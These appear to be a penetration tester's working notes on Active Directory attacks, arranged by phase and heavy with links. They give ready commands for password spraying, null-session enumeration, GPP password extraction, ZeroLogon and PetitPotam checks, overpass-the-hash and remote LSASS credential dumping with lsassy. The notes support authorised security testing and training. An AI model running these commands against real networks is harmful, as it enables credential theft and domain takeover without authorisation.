# Recon

# Unauthenticated enumeration

# First foothold
### Username == password
Using crackmapexec to test for password equal to username on domain contoso.com

```
for word in $(cat users.txt); do crackmapexec smb 10.10.0.10 -u $word -p $word -d contoso.com; done
```

### Checking NLA

### RPC / SMB null enumeration
```
rpcclient -U '' -N 10.10.0.10 -c "querygroupmem 0x200" |  cut -d '[' -f 2 | cut -d ']' -f 1
```

# Authenticated enumeration


### Active Directory user description
Using crackmapexec to get active directory user description
```
crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M get-desc-users
```

### Resetting expired passwords remotely
- https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/

### Machine Account Quota
Identify machine account quota domain attribute:
```
crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -d gnb.ca -M MAQ
```

```
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

### Admin Count
```
crackmapexec ldap company.com -u 'jdoe' -p 'Pass1234' -d company.com --admin-count
```

### Checking GPP passwords
- https://pentestlab.blog/tag/gpp/
Using crackmapexec GPP module
```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_password
```

Using Impackets Get-GPPPassword.py
```
python3 Get-GPPPassword.py company.com/jdoe:Pass1234@10.10.0.10
```

Using Metasploit module
```
use auxiliary/scanner/smb/smb_enum_gpp
msf auxiliary(smb_enum_gpp) > set rhosts 192.168.0.10
msf auxiliary(smb_enum_gpp) > set smbuser jdoe
msf auxiliary(smb_enum_gpp) > set smbpass Pass1234
msf auxiliary(smb_enum_gpp) > exploit
```

### Checking GPP autologin
```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_autologin
```

### Checking share
Checking share access rights with domain user
```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com --shares
```

### Print spooler service
Checking if print spooler service is enable using impacket RPCDUMP or crackmapexec (used RPCDUMP but can be used to scan on large range)
```
python3 rpcdump.py company.com/jdoe:Pass1234@10.10.0.10 | grep 'MS-RPRN\|MS-PAR'
crackmapexec smb rangeIP.txt -u jdoe -p Pass1234 -d company.com -M spooler | grep Spooler
```


### Local admin brute force
- https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/localbrute.ps1 (a améliorer)

### Pywerview recon tool


### Expanding BloodHound
- https://github.com/hausec/Bloodhound-Custom-Queries
- https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
- https://www.trustedsec.com/blog/expanding-the-hound-introducing-plaintext-field-to-compromised-accounts/
- https://neo4j.com/docs/api/python-driver/current/


# Exploitation

### Exploiting GPO
- https://github.com/Group3r/Group3rhttps://github.com/Group3r/Group3r

### GPP / GPO passwords


### Protected Process
- https://itm4n.github.io/lsass-runasppl/

### MachineAccountQuota (MAQ)
- https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/
- https://github.com/Kevin-Robertson/Powermad
> MachineAccountQuota (MAQ) is a **domain level attribute** that by default permits unprivileged users to attach up to **10** computers to an Active Directory (AD) domain

Various tools exist which can create a machine account from the command line or from an implant such as **StandIn**, **SharpMad** and **PowerMad**.

### Protected Users
Well-known SID/RID: ```S-1-5-21-<domain>-525```

This group was introduced in Windows Server 2012 R2 domain controllers.  

```
Get-ADGroupMember -Identity "Protected Users"
```

```
for group in $(rpcclient -U '' -N 10.10.0.10 -c enumdomgroups | grep Protected | cut -d '[' -f 3 | cut -d ']' -f 1); do rpcclient -U '' -N 10.10.0.10 -c "querygroupmem $group"; done
```

[Protected users](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) is a Security Group which aims to create additional protection against compromise of credential regarding its members, such as the followings:  
- Kerberos protocol will not use the weaker DES or RC4 encryption types in the preauthentication process
- Credential delegation (CredSSP) will not cache the user's plain text credentials
- Windows Digest will not cache the user's plain text credentials even when Windows Digest is enabled (From windows 8.1 and Server 2012 R2)
- The user’s account cannot be delegated with Kerberos constrained or unconstrained delegation
- Members of this group cannot use NTLM
- Kerberos ticket-granting tickets (TGTs) lifetime = 4 hours

### PAC
Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user

### ProxyLogon

### ProxyShell

### ZeroLogon

```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M zerologon
```

### PrintNightmare

### Petitpotam
PetitPotam, publicly disclosed by French security researcher Lionel Gilles, is comparable to the PrintSpooler bug but utilizes the **MS-EFSRPC** API to coerce authentication rather than **MS-RPRN**.

Check to validate host is vulnerable to petitpotam
```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M petitpotam
```
### samAccountName spoofing

# Active Directory exploitation

---> CHECKER RAPPORT Vulns pentest interne (privileged groups, machineAccountQuota, publication Linkedin groupe membership tenable)

### ZeroLogon

### Exploiting ADCS
Find PKI Enrollment Services in Active Directory and Certificate Templates Names
```
crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M adcs
certutil.exe -config - -ping
```

- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
- https://github.com/PKISolutions/PSPKI
- https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/

#### ADCS WebDav + NTLM relay to LDAP
- https://twitter.com/tifkin_/status/1418855927575302144/photo/1
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate#rbcd-remote-computer-takeover

#### Exploiting machine accounts (WS01$)
- https://pentestlab.blog/2022/02/01/machine-accounts/
- https://secarma.com/using-machine-account-passwords-during-an-engagement/

> Every computer joined to Active Directory (AD) has an associated computer account in AD. A computer account in AD is a security principal (same as user accounts and security groups) and as such has a number of attributes that are the same as those found on user accounts including a Security IDentifier (SID), memberOf, lastlogondate, passwordlastset, etc.

- Check the group membership for a machine account, sometime the machine account is member of elevated group or **Domain Admins**

```
Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
net group "domain admins" /domain
```

Converting machine account Hex value to NTLM hash:
```
import hashlib,binascii hexpass = "e6 5f 92..."
hexpass = hexpass.replace(" ","")
passwd = hexpass.decode("hex")
hash = hashlib.new('md4', passwd).digest()
print binascii.hexlify(hash)
```

#### Over-Pass-The-hash
- blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash

Use the user or computer NTLM hash to request Kerberos tickets.
--> Alternative to Pass The hash over NTLM protocol  
--> Useful in networks where NTLM protocol is disabled and only Kerberos is allowed.  

```
getTGT.py domain.local/workstation1$ -hashes XXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXX -dc-ip 192.168.0.10 -debug
KRB5CCNAME=/home/test/lutzenfried/tooling/workstation1\$.ccache

```
Potential error when using Over Pass The Hash attack due to the Kerberos and time.
```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
--> Error raised because of your local time, you need to synchronise the host with the DC: ```ntpdate <IP of DC>```

#### Pass The ticket
- https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket

#### Silver ticket
- https://adsecurity.org/?p=2011
- https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/

# Persistence

#### Machine/Computer accounts
- https://adsecurity.org/?p=2753

Machine accounts could be used as a backdoor for domain persistence by adding them to high privilege groups.

#### Machine/Computer accounts 2 
- https://stealthbits.com/blog/server-untrust-account/
- https://github.com/STEALTHbits/ServerUntrustAccount
- https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/

> Even though that dumping passwords hashes via the DCSync technique is not new and SOC teams might have proper alerting in place, using a computer account to perform the same technique might be a more stealthier approach.

# Post-Exploitation

#### Computer accounts privesc
> For example, if an admin server is joined to a group with backup rights on Domain Controllers, all an attacker needs to do is compromise an admin account with rights to that admin server and then get System rights on that admin server to compromise the domain.

1. Compromise an account with admin rights to admin server.
2. Admin server computer account needs rights to Domain Controllers.


### Active Directory NTDS : Clear Text passwords (Reversible encryption)
Sometimes when using [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract NTDS.dit you will encounter some CLEARTEXT credential wihtin the dump.   

Cleartext does not really mean that the passwords are stored as is. They are stored in an encrypted form using **RC4** encryption.   

The key used to both encrypt and decrypt is the **SYSKEY**, which is stored in the registry and can be extracted by a domain admin.This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.

List users with "Store passwords using reversible encryption" enabled
```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
--> list of user account control flag :   
- https://docs.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol
- http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm

<img src="./images/store-password-using-reversible-encryption.png" width="250"/>

### Accessing LSASS secrets

##### Lsassy
- https://github.com/Hackndo/lsassy

```
lsassy -d company.local -u jdoe -p Pass1234 192.168.1.0/24
```

## Data-Exfiltration
Data exfiltration and DLP (Data Loss Prevention) bypass.

# Reporting / Collaborative


### Resources
#### PetitPotam and ADCS
- https://www.optiv.com/insights/source-zero/blog/petitpotam-active-directory-certificate-services


To use for the course
- https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/
- https://github.com/infosecn1nja/AD-Attack-Defense
- https://h4ms1k.github.io/Red_Team_Active_Directory/#
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- https://book.hacktricks.xyz/windows/active-directory-methodology
- https://anishmi123.gitbooks.io/oscp-my-journey/content/active-directory/ad-attacks.html
- https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
- https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/amp/
- https://github.com/threatexpress/red-team-scripts
- https://www.thehacker.recipes/ad/recon
- https://www.praetorian.com/blog/red-team-local-privilege-escalation-writable-system-path-privilege-escalation-part-1/
- https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/
- https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/
- https://github.com/tevora-threat/SharpView
- https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/
- Delegation
- Printnightmare
- Proxylogon,proxyshell
https://www.praetorian.com/blog/reproducing-proxylogon-exploit/
- Trust, forest
- primary group id
https://adsecurity.org/?tag=primarygroupid
https://www.tenable.com/blog/primary-group-id-attack-in-active-directory-how-to-defend-against-related-threats
https://www.semperis.com/blog/how-attackers-can-use-primary-group-membership-for-defense-evasion/
https://blog.alsid.eu/primary-group-id-attack-a50dca142771

- checker for internal OWA, Exchange vuln
- Exchange vuln privexchange.py
- PAC
- Sam Account Name spoofing
- LAPS and LAPS bypass
https://www.praetorian.com/blog/obtaining-laps-passwords-through-ldap-relaying-attacks/
- script to enum domain group, protected user unauthenticated (bash + python projects)
- Kerberoast/asrep
- https://pentestbook.six2dez.com/post-exploitation/windows/ad
- ldap signing
- Spooler
- petitpotam
https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/
https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
https://www.ravenswoodtechnology.com/protect-your-windows-network-from-the-petitpotam-exploit/
- ADCS
https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#domain-escalation-via-certificates
https://github.com/ly4k/Certipy
- WPAD
- LLMNR NbtNS mDNS
- adsecurity all
- anonymous RPC/SMB
- Wdigest
- windows authentication cache (HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\CachedLogonsCount)
- LSASS
- DPAPI
- reprendre training specterops
- NLA
- Service accounts with interactive logon
- WSUS exploitation
- Permissive Active Directory Domain Services https://blog.netspi.com/exploiting-adidns/
- DHCP spoofing
- ARP spoofing
- MITM6
- NAC bypass
https://www.thehacker.recipes/physical/networking/network-access-control
- VLAN hopping
- SNMP default
- Potato family : https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all
- SMTP
- ACL/DACL exploitation
- Owner https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#owns
- Quick wins (RMI, tomcat,...)
- password stored in LSA
VDocumentation about LSA secrets:
          https://www.passcape.com/index.php?section=docsys&cmd=details&id=23
        - >-
          LSA secrets exfiltration:
          https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets
        - >-
          Microsoft documentation on LSA secrets:
          https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#BKMK_LSA
